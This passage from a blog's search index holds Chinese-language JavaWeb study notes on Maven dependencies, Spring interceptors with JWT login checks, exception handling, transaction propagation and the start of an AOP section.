<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>JavaWeb_仓库合集_1</title>
    <link href="/2023/05/31/JavaWeb_config_1/"/>
    <url>/2023/05/31/JavaWeb_config_1/</url>
    
    <content type="html"><![CDATA[<h1 id="Maven-amp-Spring常用仓库"><a href="#Maven-amp-Spring常用仓库" class="headerlink" title="Maven&amp;Spring常用仓库"></a>Maven&amp;Spring常用仓库</h1><h2 id="一、Maven仓库"><a href="#一、Maven仓库" class="headerlink" title="一、Maven仓库"></a>一、Maven仓库</h2><h3 id="1、XML解析-slf4j打印日志必须的三个依赖包"><a href="#1、XML解析-slf4j打印日志必须的三个依赖包" class="headerlink" title="1、XML解析(slf4j打印日志必须的三个依赖包)"></a>1、XML解析(slf4j打印日志必须的三个依赖包)</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.17<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.slf4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>slf4j-log4j12<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.7.21<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.slf4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>slf4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.7.21<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2、JWT"><a href="#2、JWT" class="headerlink" title="2、JWT"></a>2、JWT</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.jsonwebtoken<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jjwt<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.9.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.jsonwebtoken<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jjwt-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.11.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.jsonwebtoken<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jjwt-impl<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.11.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.jsonwebtoken<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jjwt-jackson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.11.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3、-Test"><a href="#3、-Test" class="headerlink" title="3、@Test"></a>3、@Test</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="二、Spring框架"><a href="#二、Spring框架" class="headerlink" title="二、Spring框架"></a>二、Spring框架</h2><h3 id="1、spring事务管理日志"><a href="#1、spring事务管理日志" class="headerlink" title="1、spring事务管理日志"></a>1、spring事务管理日志</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-comment">#开启事务管理日志</span><br><span class="hljs-attr">logging:</span><br>  <span class="hljs-attr">level:</span><br>    <span class="hljs-attr">org.springframework.jdbc.support.JdbcTransactionManager:</span> <span class="hljs-string">debug</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWeb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb基础2-2</title>
    <link href="/2023/05/30/JavaWeb_2_2/"/>
    <url>/2023/05/30/JavaWeb_2_2/</url>
    
    <content type="html"><![CDATA[<h1 id="JavaWeb基础2-2"><a href="#JavaWeb基础2-2" class="headerlink" title="JavaWeb基础2-2"></a>JavaWeb基础2-2</h1><h2 id="六、Interceptor"><a href="#六、Interceptor" class="headerlink" title="六、Interceptor"></a>六、Interceptor</h2><h3 id="1、概念"><a href="#1、概念" class="headerlink" title="1、概念"></a>1、概念</h3><p>概念：是一种动态拦截方法调用的机制，类似于过滤器。Spring框架中提供的，用来动态拦截控制器方法的执行。<br>作用：拦截请求,在指定的方法调用前后，根据业务需要执行预先设定的代码。</p><p><img src="/img/JavaWeb/2-2/1.png"></p><p>1.定义拦截器，实现HandlerInterceptor接口， 并重写其所有方法。</p><p>2.注册拦截器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span> <span class="hljs-comment">// 目标资源方法执行前执行，放回true:放行，返回false: 不放行</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> preHandle<br><span class="hljs-meta">@Override</span> <span class="hljs-comment">// 目标资源方法执行后执行</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> postHandle<br><span class="hljs-meta">@Override</span> <span class="hljs-comment">//视图渲染完毕后执行，最后执行</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> afterCompletion <br></code></pre></td></tr></table></figure><p>3.交给AOP容器管理，加上@component</p><h3 id="2、入门"><a href="#2、入门" class="headerlink" title="2、入门"></a>2、入门</h3><ol><li>定义拦截器，实现HandlerInterceptor接口， 并重写其所有方法。</li><li>注册拦截器</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginCheckInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">//目标资源方法运行前运行, 返回true: 放行, 放回false, 不放行</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//1.获取请求url。</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> req.getRequestURL().toString();<br>        log.info(<span class="hljs-string">&quot;请求的url: &#123;&#125;&quot;</span>,url);<br><br>        <span class="hljs-comment">//2.判断请求url中是否包含login，如果包含，说明是登录操作，放行。</span><br>        <span class="hljs-keyword">if</span>(url.contains(<span class="hljs-string">&quot;login&quot;</span>))&#123;<br>            log.info(<span class="hljs-string">&quot;登录操作, 放行...&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-comment">//3.获取请求头中的令牌（token）。</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jwt</span> <span class="hljs-operator">=</span> req.getHeader(<span class="hljs-string">&quot;token&quot;</span>);<br><br>        <span class="hljs-comment">//4.判断令牌是否存在，如果不存在，返回错误结果（未登录）。</span><br>        <span class="hljs-keyword">if</span>(!StringUtils.hasLength(jwt))&#123;<br>            log.info(<span class="hljs-string">&quot;请求头token为空,返回未登录的信息&quot;</span>);<br>            <span class="hljs-type">Result</span> <span class="hljs-variable">error</span> <span class="hljs-operator">=</span> Result.error(<span class="hljs-string">&quot;NOT_LOGIN&quot;</span>);<br>            <span class="hljs-comment">//手动转换 对象--json --------&gt; 阿里巴巴fastJSON</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">notLogin</span> <span class="hljs-operator">=</span> JSONObject.toJSONString(error);<br>            resp.getWriter().write(notLogin);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-comment">//5.解析token，如果解析失败，返回错误结果（未登录）。</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            JwtUtils.parseJWT(jwt);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<span class="hljs-comment">//jwt解析失败</span><br>            e.printStackTrace();<br>            log.info(<span class="hljs-string">&quot;解析令牌失败, 返回未登录错误信息&quot;</span>);<br>            <span class="hljs-type">Result</span> <span class="hljs-variable">error</span> <span class="hljs-operator">=</span> Result.error(<span class="hljs-string">&quot;NOT_LOGIN&quot;</span>);<br>            <span class="hljs-comment">//手动转换 对象--json --------&gt; 阿里巴巴fastJSON</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">notLogin</span> <span class="hljs-operator">=</span> JSONObject.toJSONString(error);<br>            resp.getWriter().write(notLogin);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-comment">//6.放行。</span><br>        log.info(<span class="hljs-string">&quot;令牌合法, 放行&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">//目标资源方法运行后运行</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;postHandle ...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">//视图渲染完毕后运行, 最后运行</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;afterCompletion...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>3.拦截器-拦截路径</p><p>拦截器可以根据需求，配置不同的拦截路径:</p><p><img src="/img/JavaWeb/2-2/2.png"></p><p>4.执行流程</p><p><img src="/img/JavaWeb/2-2/3.png"></p><p>5.Filter与Interceptor：</p><p>接口规范不同：过滤器需要实现Filter接口，而拦截器需要实现HandleaInterceptor接口。</p><p>拦截范围不同：过滤器Filter会拦截所有的资源，而Interceptor只 会拦截Spring环境中的资源。</p><h3 id="3、登录校验案例"><a href="#3、登录校验案例" class="headerlink" title="3、登录校验案例"></a>3、登录校验案例</h3><h3 id="4、全局异常处理器"><a href="#4、全局异常处理器" class="headerlink" title="4、全局异常处理器"></a>4、全局异常处理器</h3><p>编写一个exception包，其中包含GlobalExceptionHandler类，相关方法实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestControllerAdvice</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GlobalExceptionHandler</span> &#123;<br>    <span class="hljs-meta">@ExceptionHandler(Exception.class)</span><br>    <span class="hljs-keyword">public</span> Result <span class="hljs-title function_">ex</span><span class="hljs-params">(Exception ex)</span> &#123;<br>        ex.printStackTrace();<br>        <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;对不起，操作失败，请联系管理员&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="七、事务管理"><a href="#七、事务管理" class="headerlink" title="七、事务管理"></a>七、事务管理</h2><h3 id="1、概念-1"><a href="#1、概念-1" class="headerlink" title="1、概念"></a>1、概念</h3><p>事务是一组操作的集合，它是一个不可分割的工作单位，这些操作要么同时成功，要么同时失败。</p><p>操作：</p><p>开启事务(- -组操作开始前,开启事务) : start transaction / begin ;</p><p>提交事务(这组操作全部成功后，提交事务) : commit ; </p><p>回滚事务(中间任何-一个操作出现异常,回滚事务) : rollback ;</p><h3 id="2、Spring事物管理"><a href="#2、Spring事物管理" class="headerlink" title="2、Spring事物管理"></a>2、Spring事物管理</h3><p>案例分析：删除部门的时候，删除部门下的全部员工。</p><p>会出现的问题：即使程序运行抛出了异常 / 部门依然删除了 / 但是部门下的员工却没有删除 ， 造成了数据的不一致。</p><p><img src="/img/JavaWeb/2-2/4.png"></p><h4 id="Transactional"><a href="#Transactional" class="headerlink" title="@Transactional"></a>@Transactional</h4><p>注解: @Transactional</p><p>位置:业务(service) 层的方法上、类上、接口上</p><p>作用:将当前方法交给spring进行事务管理,方法执行前,开启事务;成功执行完毕，提交事务;出现异常,回滚事务</p><p><img src="/img/JavaWeb/2-2/5.png"></p><p>作用在接口/类，在调用此接口/类的，都会被执行。</p><p>一般都在增删改的方法上加此注解。</p><p>案例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-meta">@Transactional</span><br><span class="hljs-comment">//加上@Transactional后整个方法将变成事务（Spring事务管理）</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(Integer id)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            deptMapper.deleteById(id); <span class="hljs-comment">//根据ID删除部门数据</span><br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>/<span class="hljs-number">0</span>;<br>            <span class="hljs-comment">//if(true)&#123;throw new Exception(&quot;出错啦...&quot;);&#125;</span><br><br>            empMapper.deleteByDeptId(id); <span class="hljs-comment">//根据部门ID删除该部门下的员工</span><br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-type">DeptLog</span> <span class="hljs-variable">deptLog</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeptLog</span>();<br>            deptLog.setCreateTime(LocalDateTime.now());<br>            deptLog.setDescription(<span class="hljs-string">&quot;执行了解散部门的操作,此次解散的是&quot;</span>+id+<span class="hljs-string">&quot;号部门&quot;</span>);<br>            deptLogService.insert(deptLog);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="事务进阶"><a href="#事务进阶" class="headerlink" title="事务进阶"></a>事务进阶</h4><h6 id="rollbackFor"><a href="#rollbackFor" class="headerlink" title="rollbackFor"></a>rollbackFor</h6><p>默认情况下，只有出现RuntimeException才回滚异常。rollbackFor属性用于控制出现何种异常类型，回滚事务 。</p><p>设置回滚异常类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(Integer id)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        deptMapper.deleteById(id); <span class="hljs-comment">//根据ID删除部门数据</span><br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>/<span class="hljs-number">0</span>;<br>        <span class="hljs-comment">//if(true)&#123;throw new Exception(&quot;出错啦...&quot;);&#125;</span><br><br>        empMapper.deleteByDeptId(id); <span class="hljs-comment">//根据部门ID删除该部门下的员工</span><br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-type">DeptLog</span> <span class="hljs-variable">deptLog</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeptLog</span>();<br>        deptLog.setCreateTime(LocalDateTime.now());<br>        deptLog.setDescription(<span class="hljs-string">&quot;执行了解散部门的操作,此次解散的是&quot;</span>+id+<span class="hljs-string">&quot;号部门&quot;</span>);<br>        deptLogService.insert(deptLog);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="propagation"><a href="#propagation" class="headerlink" title="propagation"></a>propagation</h6><p>事务传播行为：指的就是当一个事务方法被另一个事务方法调用时，这个事务方法应该如何进行事务控制。</p><table><thead><tr><th>属性值</th><th>含义</th></tr></thead><tbody><tr><td>REQUIRED</td><td>[默认值]需要事务，有则加入，无则创建新事务</td></tr><tr><td>REQUIRES_ NEW</td><td>需要新事务，无论有无，总是创建新事务</td></tr><tr><td>SUPPORTS</td><td>支持事务，有则加入，无则在无事务状态中运行</td></tr><tr><td>NOT_SUPPORTED</td><td>不支持事务，在无事务状态下运行，如果当前存在已有事务,则挂起当前事务</td></tr><tr><td>MANDATORY</td><td>必须有事务，否则抛异常</td></tr><tr><td>NEVER</td><td>必须没事务，否则抛异常</td></tr></tbody></table><p>使用try-finally语句，即使上方执行异常，下方仍然可以正常操作（保障日志记录正常）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Transactional</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(Integer id)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            deptMapper.deleteById(id); <span class="hljs-comment">//根据ID删除部门数据</span><br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>/<span class="hljs-number">0</span>;<br>            <span class="hljs-comment">//if(true)&#123;throw new Exception(&quot;出错啦...&quot;);&#125;</span><br><br>            empMapper.deleteByDeptId(id); <span class="hljs-comment">//根据部门ID删除该部门下的员工</span><br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-type">DeptLog</span> <span class="hljs-variable">deptLog</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeptLog</span>();<br>            deptLog.setCreateTime(LocalDateTime.now());<br>            deptLog.setDescription(<span class="hljs-string">&quot;执行了解散部门的操作,此次解散的是&quot;</span>+id+<span class="hljs-string">&quot;号部门&quot;</span>);<br>            deptLogService.insert(deptLog);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>如果只写一个@Transactional，如果出错，会导致日志写入后回滚，把日志删除</p><p>因此，在创建日志的记录中，使用@Transactional(propagation = Propagation.REQUIRES_NEW)，使其开启一个新事务这样就不会没有日志了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeptLogServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">DeptLogService</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> DeptLogMapper deptLogMapper;<br><br>    <span class="hljs-meta">@Transactional(propagation = Propagation.REQUIRES_NEW)</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(DeptLog deptLog)</span> &#123;<br>        deptLogMapper.insert(deptLog);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意：正在运行的事务只能有一个，原运行的事物会被挂起，而运行新事务。</p><p>REQUIRED：大部分情况下都是用该传播行为即可。</p><p>REQUIRES_ NEW：当我们不希望事务之间相互影响时，可以使用该传播行为。比如：下订单前需要记录日志，不论订单保存成功与否,都需要保证日志记录能够记录成功。</p><h2 id="八、AOP"><a href="#八、AOP" class="headerlink" title="八、AOP"></a>八、AOP</h2><h3 id="1、基础"><a href="#1、基础" class="headerlink" title="1、基础"></a>1、基础</h3><p>AOP：Aspect Oriented Programming（面向切面编程面向方面编程），其实就是面向特定方法编程。</p><p><img src="/img/JavaWeb/2-2/6.png"></p><p><img src="/img/JavaWeb/2-2/7.png"></p><h3 id="2、SpringAOP快速入门"><a href="#2、SpringAOP快速入门" class="headerlink" title="2、SpringAOP快速入门"></a>2、SpringAOP快速入门</h3><p>导入依赖：在pom.xml中导入AOP的依赖</p><p>SpringAOP是基于动态代理技术实现的。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-aop<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span 